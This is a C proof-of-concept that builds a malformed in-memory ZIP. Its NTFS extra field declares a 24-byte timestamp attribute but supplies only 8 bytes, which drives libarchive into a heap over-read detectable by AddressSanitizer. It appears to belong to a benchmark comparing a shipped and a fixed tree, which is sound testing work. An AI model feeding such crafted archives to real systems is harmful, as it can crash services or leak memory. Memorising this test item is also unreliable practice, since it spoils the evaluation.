/*
 * Residual-defect PoC for the ZIP 0x000A (NTFS) extra-field reader.
 *
 * Drives libarchive's public read API over an in-memory ZIP whose single
 * entry carries an NTFS extra field announcing a Tag-1 attribute of the
 * canonical size 24, but whose extra field actually ends before those 24
 * bytes are present. A reader that decodes the fixed 24-byte FILETIME
 * triplet without re-checking it against the remaining extra-field length
 * reads past the end of the extra data.
 *
 * The malicious extra field is the last thing in the heap buffer handed to
 * archive_read_open_memory(), so the over-read crosses the allocation
 * boundary and AddressSanitizer reports a heap-buffer-overflow.
 *
 * Expected: aborts under ASan on the shipped tree; clean on the golden tree.
 */
#include <archive.h>
#include <archive_entry.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static const unsigned char zip[] = {
	/* --- local file header --- */
	0x50, 0x4b, 0x03, 0x04, /* local file header signature */
	0x14, 0x00,             /* version needed to extract: 2.0 */
	0x00, 0x00,             /* general purpose bit flag */
	0x00, 0x00,             /* compression method: stored */
	0x00, 0x00,             /* last mod file time */
	0x21, 0x00,             /* last mod file date */
	0x00, 0x00, 0x00, 0x00, /* CRC-32 */
	0x00, 0x00, 0x00, 0x00, /* compressed size = 0 */
	0x00, 0x00, 0x00, 0x00, /* uncompressed size = 0 */
	0x08, 0x00,             /* file name length = 8 */
	0x14, 0x00,             /* extra field length = 20 */
	0x6e, 0x74, 0x66, 0x73, 0x2e, 0x74, 0x78, 0x74, /* "ntfs.txt" */
	/* extra field 0x000a "NTFS" (datasize = 16) */
	0x0a, 0x00,             /* extra field ID = 0x000a */
	0x10, 0x00,             /* extra field size = 16 */
	0x00, 0x00, 0x00, 0x00, /* reserved */
	0x01, 0x00,             /* NTFS attribute tag 1 */
	0x18, 0x00,             /* NTFS attribute 1 size = 24 (but only 8 follow) */
	0x80, 0x41, 0xfd, 0x67, 0xc2, 0x76, 0xda, 0x01, /* only 8 of 24 bytes */
	/* buffer ends here: decoding the full 24-byte triplet over-reads */
};

int
main(void)
{
	struct archive *a;
	struct archive_entry *ae;
	size_t n = sizeof(zip);
	unsigned char *buf = malloc(n);
	int r;

	memcpy(buf, zip, n);

	a = archive_read_new();
	archive_read_support_format_zip(a);
	r = archive_read_open_memory(a, buf, n);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open failed: %s\n", archive_error_string(a));
		return 2;
	}

	r = archive_read_next_header(a, &ae);
	printf("read_next_header returned %d\n", r);

	archive_read_free(a);
	free(buf);
	return 0;
}
